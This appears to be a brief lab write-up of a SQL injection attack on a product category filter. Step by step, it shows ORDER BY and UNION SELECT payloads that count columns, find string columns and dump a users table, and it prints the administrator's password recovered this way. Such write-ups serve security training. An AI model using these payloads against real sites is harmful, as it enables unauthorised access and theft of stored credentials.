SQL Injection - Product category filter.

End Goal - Output the usernames and passwords in the users table and login as the administrator user.

Analysis:
--------

1) Determine # of columns that the vulnerable query is using
' order by 1--
' order by 2--
' order by 3-- -> internal server error

3-1 = 2


2) Determine the data type of the columns

select a, b from products where category='Gifts

' UNION select 'a', NULL--
' UNION select 'a', 'a'--
-> both columns are of data type string

' UNION select username, password from users--

administrator
tqx26ugf8jp1g30atsu9

script.py <url> 